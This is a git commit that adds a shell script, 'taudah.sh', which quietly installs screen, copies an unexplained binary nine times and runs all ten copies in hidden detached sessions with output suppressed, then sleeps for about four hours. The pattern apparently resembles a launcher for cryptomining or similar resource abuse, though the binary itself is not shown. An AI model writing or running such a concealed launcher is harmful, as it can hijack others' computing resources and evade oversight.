5d07c1a7c317aec67e4be5a1f9dccca58c0d9bae
McgeeLucia1970 <eliham2132@outlook.com>
2024-12-03 04:11:30 +1100

    a taudah.sh

---
+++ taudah.sh
@@ -0,0 +1,22 @@
+sudo apt install screen -y >/dev/null 2>&1 
+cp taudah taudah1
+cp taudah taudah2
+cp taudah taudah3
+cp taudah taudah4
+cp taudah taudah5
+cp taudah taudah6
+cp taudah taudah7
+cp taudah taudah8
+cp taudah taudah9
+sleep 5
+screen -dmS taudah ./taudah z >/dev/null 2>&1 
+screen -dmS taudah1 ./taudah1 z >/dev/null 2>&1 
+screen -dmS taudah2 ./taudah2 z >/dev/null 2>&1 
+screen -dmS taudah3 ./taudah3 z >/dev/null 2>&1 
+screen -dmS taudah4 ./taudah4 z >/dev/null 2>&1 
+screen -dmS taudah5 ./taudah5 z >/dev/null 2>&1 
+screen -dmS taudah6 ./taudah6 z >/dev/null 2>&1 
+screen -dmS taudah7 ./taudah7 z >/dev/null 2>&1 
+screen -dmS taudah8 ./taudah8 z >/dev/null 2>&1 
+screen -dmS taudah9 ./taudah9 z >/dev/null 2>&1
+sleep 14440
